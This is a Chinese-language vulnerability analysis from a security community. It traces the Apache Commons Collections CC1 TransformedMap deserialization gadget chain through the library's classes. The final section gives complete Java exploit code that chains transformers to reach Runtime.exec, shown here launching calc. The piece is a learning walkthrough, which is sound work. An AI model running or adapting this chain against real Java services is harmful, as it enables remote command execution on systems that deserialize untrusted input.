---
title: 【先知】利用 ChainedTransformer 构造 CC1-TransformedMap 反序列化漏洞利用链
source: https://xz.aliyun.com/news/92589
source_host: xz.aliyun.com
clip_date: 2026-07-30T14:08:27+08:00
trace_id: 5b8726f3-ff56-4c79-9780-87713f744880
content_hash: ed2577c82232845152c9f5711e4294afd6e1fba9cfd08024b9a38465e5229933
status: synced
tags:
  - 先知
  - 漏洞分析
  - Java反序列化
series: null
feed_source: 先知安全技术社区
ai_summary: CC1-TransformedMap 反序列化漏洞利用链的核心是利用 `ChainedTransformer` 将 `ConstantTransformer` 与多个 `InvokerTransformer` 串联，绕过 `Runtime` 无法序列化的限制，最终通过 `AnnotationInvocationHandler.readObject()` 触发任意命令执行。
ai_summary_style: key-points
images_status:
  total: 46
  succeeded: 46
  failed_urls: []
notion_page_id: 3ad75244-d011-819a-a9fd-e5b1b778f272
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> CC1-TransformedMap 反序列化漏洞利用链的核心是利用 `ChainedTransformer` 将 `ConstantTransformer` 与多个 `InvokerTransformer` 串联，绕过 `Runtime` 无法序列化的限制，最终通过 `AnnotationInvocationHandler.readObject()` 触发任意命令执行。
> 
> - **漏洞根源：** `InvokerTransformer.transform()` 通过反射调用任意方法，其方法名、参数类型、参数值均由构造参数传入且完全可控，形成危险操作点。
> - **链式调用构造：** `TransformedMap.decorate()` 将普通 `Map` 装饰后，其 `entrySet().iterator().next().setValue()` 会调用 `valueTransformer.transform()`，从而串联起恶意 Transformer。
> - **命令执行链：** `ChainedTransformer` 中第一个为 `ConstantTransformer(Runtime.class)`，后续通过 `InvokerTransformer` 反射调用 `getMethod("getRuntime")`、`invoke()` 和 `exec("calc")`，完整实现从 Runtime.class 到命令执行。
> - **反序列化入口：** `AnnotationInvocationHandler.readObject()` 遍历成员变量的 `entrySet` 并调用 `setValue`，传入被装饰的恶意 Map 即可触发整条链。
> - **Runtime 序列化规避：** `Runtime` 未实现 `Serializable`，不能直接传入；利用 `Runtime.class` 作为 Class 对象，配合反射获取实例，从而突破序列化限制。

### Apache Commons Collections 简介

开始分析链子之前我们先了解一下什么是Apache Commons Collections。Apache Commons Collections是Apache提供的一个Java库，它扩展了Java自带的集合框架。通过这个库，咱们可以使用更多种类的集合类型，以及各种实用的集合操作工具。这些功能在标准Java库中往往是缺失的，或者实现起来比较繁琐。

### JDK版本：

jdk-8U65

下载地址： [jdk-8u65-windows-x64.exe下载介绍:基于Java生态的JDK资源下载项目 - AtomGit](https://gitcode.com/Universal-Tool/bbffb?utm_source=article_gitcode_universal&index=top&type=card&&uuid_tt_dd=10_28694778930-1773394523653-683686&isLogin=1&from_id=147368258&from_link=b5d54535431ceb6f381046ebf3fe2442)

jdk-8U65源码下载地址： [Release jdk8u65-b10 · openjdk/jdk8u](https://github.com/openjdk/jdk8u/releases/tag/jdk8u65-b10)

### 环境配置步骤：

#### 先配置ida外的

正常下载安装好java环境后 这个src的源码里面是没有sun这个文件夹的

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/8fad939d987bd7b5.png)

这个时候我们去下载的jdk-8U65源码里面 找到路径 jdk8u-masterjdksrcshareclasses 把这个sun复制到上面的源码src文件夹下

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/112cd8c55d60212b.png)

最终形式：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/30f5a8406c2d2ef7.png)

#### 对与ida配置：

新建立一个项目 箭头部分要按照这个 别的名称什么的自己起即可

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/7adc5f8dd2f73206.png)

建立之后打开项目结构：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/c4a3b18ba16a6bb2.png)

添加并且导入之前的src源码：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/3b9513d409eef55c.png)

pom.xml文件内容：

```plain
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>text</artifactId>
    <version>1.0-SNAPSHOT</version>
    <dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.2.1</version>
        </dependency>
        <dependency>
            <groupId>org.testng</groupId>
            <artifactId>testng</artifactId>
            <version>RELEASE</version>
            <scope>test</scope>
        </dependency>
        <dependency>
            <groupId>junit</groupId>
            <artifactId>junit</artifactId>
            <version>4.12</version>
            <scope>test</scope>
        </dependency>
    </dependencies>
    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>

</project>
```

### 链子分析

分析之前我们先看看大概的流程图如下，我们先绕过插入的哪个方法 整理思路

一般对与反序列化链子 无论是java还是php的 基本上都是从后往前分析比较好 肯定嘛 先找到危险操作最主要！ 先放一个主流程

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/d8103c529d7a819c.png)

#### InvokerTransformer

故事的开始是一处小可疑点 我们发现这个接口 我们传入一个对象 他也会返回一个对象呢 如果我们传入一个可以调用的对象，同时有一个类的调用这个接口的代码会对处理的对象，返回处理后的结果呢？

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/f6660567b66ae90b.png)

我们找找调用了这个接口呢 这里还真找到一个：InvokerTransformer这个类

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/e0bc6e3dfbc58db0.png)

还真的巧 调用了传入的对象 然后反射操作 返回执行的结果 但是我们最最最最主要看看看看参数是否可控呢？

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/c6f9d515640ec3db.png)

到前面看看这几个属性，看到是私有属性 但是是通过构造方法传入的 并且构造方法是公开的 拿下！

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/98ba3ae41638b7f9.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/a878655ddb4d9a39.png)

我们本地试一下：大概意思就是我们需要让input传入的是一个Runtime的对象即可：Runtime.getRuntime()，然后第2，3，4的箭头分别要传入危险方法（exec），危险方法的参数属性（Sting.class），执行的命令（calc）

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/2c2316b7eabeb436.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/8bc2fc417cddb13f.png) 直接构造一波：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/225e3bf215048b8a.png)

#### TransformedMap

这个时候看看谁能利用transform呢 这个时候找到了TransformedMap类：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/6f89e3e17c36fe96.png)

其中这个checkSetValue方法里面调用了transfrom 最主要的是valueTransformer这个参数 是否可控呢 不可控就寄 先看构造方法（受保护） 感觉有点寄了

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/d5a13635f68330c8.png)

嗯？ 公开的静态方法 并且new了构造方法 并且传入的属性就是TransformedMap的valueTransformer 可控 成了

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/d1a13dd39009d2fa.png)

我们尝试构造一波：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/459d9885d118a9a4.png)

不是 咋有点红呢 去看看 不是 也是受保护的啊 行吧 我们看看谁调用了checkSetValue

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/52799dbd35707200.png)

#### AbstractInputCheckedMapDecorator

还真找到了一个AbstractInputCheckedMapDecorator

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/01751b30c75f2711.png)

但是很头疼的是 这个setValue是在MapEntry这个类里面 这个类又是保护类

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/ddfd3ad7aa87e427.png)

这里看到前面的一个类 有next方法 还new MapEntry 这个时候不免想到正确for循环的底层

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/7eda4dea87b7dcf4.png)

我们在向前面看一个类 看到这个类new EntrySetIterator 并且存在iterator方法

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/f9ed1b0261cedfc0.png)

我们写一个增强 for 循环调用顺序：entrySet() → iterator() → hasNext() → next() 这个时候就会到setValue，首先先写一个原始map 然后再增强map 然后同增强for循环 其中parent这个值 我们看一个细节 他是继承AbstractInputCheckedMapDecorator的 所以parent这个值其中指定是TransformedMap对象：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/768cba0fb4580987.png)

构造代码 一直在构造如何调用checkSetValue 但是别忘了传InvokerTransformer这个对象：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/7bb41cdf7e943269.png)

细说细节：我们看到这里自定义了一个HashMap 当然类型还有别的（TreeMap等等） 正常的原始的就是map 我们调用的时候就是map.put 但是这里为什么要增强呢 当然是新的map会增加一些功能 这里就是恶意功能 这里构造之后 map.put变成了decorate.put 当然我们执行put没有意义 我们看到万恶之源是AbstractInputCheckedMapDecorator的entrySet 他是增强后for循环调用到setValue的突破口 刚好map默认是可以调用entrySet 的 我们增强后 就会调用我们第一指向的entrySet 。

下图是map源码：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/7da4a8a3c035763c.png)

#### AnnotationInvocationHandler

告诉点大家不知道的 反序列化会调用readobject（😊）开玩笑

我们看看能不能找到可以重写的readObject 并且调用了setValue呢 AnnotationInvocationHandler就是了

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/e7166201cff1ec98.png)

可以看到如果想调用到setValue 我们需要绕过两个if

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/9dba8f69c9cf5e09.png)

我们仔细分析一下：memberTypes.get(name);是获取一个类型 eg：java.class.Runtime 然后呢 memberValue.getKey();是获取一个键值eg：a=b 那么这个值（name）就是a了 注意memberValues我们是可控的 那么我们是否传入一个java自己存在的class属性呢eg：Target.class 我们可以输出一个这个属性的键

```plain
for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
    String name = memberValue.getKey();
    Class<?> memberType = memberTypes.get(name);
```

调试代码：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/47e19d3be8e0c3a3.png)

所以现在呢 我们就可以让type这个值为Target.class memberValues为decorate即可

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/67209bc45781af14.png)

但是呢 这个类就是受保护的：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/323079257059b150.png)

这里也没有其他方法调用 那我们还有一种方法就是：反射！

因为是本地条件 所以触发readObject呢 我们自己写一个（CC2Test）即可：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/d818323c64740cf0.png)

利用脚本：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/fdeb86e4e180885f.png)

我们先尝试断点看是否过了两个if：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/bd349da126591186.png)

直接调试一手 成功到达setValue：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/e92a6faed18b25c4.png)

但是 我好像有种不祥的预感 这个setValue里面的参数 不可控啊。。。 之前都是直接传入Runtime.getRuntime()的

这个时候有没有就是一种transform 输入=输出 并且输入可控输入 并且不需要传入transform值或者传什么无所谓的呢

#### ConstantTransformer

看到transform传入的什么 返回的还是我们自定义的

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/8d1f35de84ec681b.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/6b37972e70753d4b.png)

可以 那我们使用这个transform吧 不可以 这transform没有危险的方法啊 你看之前的InvokerTransformer.transform()这个里面是可以执行反射的 。。。。。。。。

这个时候真神出现了ChainedTransformer

#### ChainedTransformer

一句话概括这个transform 就是 第一个对象transform返回的内容 当作第二个对象transform传入的内容

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/3ed473ac2dd9d1e7.png)

那我们想想 是不是可以在增强map里面存放ChainedTransformer这个transform 同时 传入ConstantTransformer对象为第一个

InvokerTransformer对象为第二个呢？ 试试去 源码：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/19a3d30a5a9fd09f.png)

最后的最后终于迎来了我们的最后一个问题 那就是Runtime 我们来看看Runtime.java

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/16158204079944e7.png)

很明显 没有implements Serializable 意味着没有序列化接口 那么怎么会反序列化呢 不可能啊 所以这个时候就还是老样子反射！

我们先来看看正常的Runtime的反射：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/271f338c601df9d2.png)

很明显 Runtime.class这个是可以传入的 所以要构造 getMethod，invoke，exec三个方法 下面就是传入相对类型的值就行了

看清楚传入的是什么类型的值即可

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/7079c67b0f352ce4.png)

然后就是看方法里面的属性类型 eg：getMethod里面是Sring.class和Class\[\].class即可

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/ad16d671016bce1b.png)

最后源码 拿下！

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/94fcd58a1e395a2e.png)

#### 源码：

```plain
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.junit.Test;
import sun.reflect.annotation.AnnotationType;

import java.io.IOException;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class CC3Test {
    @Test
    public void invokeExec() throws Exception{

//        ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.getRuntime());
//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",
//                new Class[]{String.class},
//                new Object[]{"calc"});

        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})});
        HashMap<Object, Object> map = new HashMap<>();
        map.put("value","value");
        Map<Object, Object> decorate = TransformedMap.decorate(map, null, chainedTransformer);

        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(Target.class, decorate);
        CC2Test.serialize(o);
        CC2Test.unserialize("ser.bin");

    }

   @Test
    public void test3() throws Exception {
        Class clazz = Runtime.class;
        Method getRuntimeMethod = clazz.getMethod("getRuntime");
        Runtime runtime= (Runtime) getRuntimeMethod.invoke(null);
        Method execMethod = clazz.getMethod("exec", String.class);
        execMethod.invoke(runtime, "calc");
    }
}
```

### 完整流程图：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/ffaad88fa37bb84d.png)

### 小问题

为什么要这个sun文件夹呢？

因为sun 文件夹里存放的是“Java 核心类库（rt.jar）中所有内部实现类的 Java 源码，我们调试的时候是一些是需要这些java代码的，而不是编译后的class代码 ，因为class里面的一些局部变量会是var1，2，3。。。这种的，调试不便。

为什么前面写代码抛异常的时候用了IOException，但是后面又用Exception？

Exception是IOException的父类，他可以抛复杂的异常，会显示的报错栈多一点 不够精细 而IOException就必须精细，可以看清错误点。
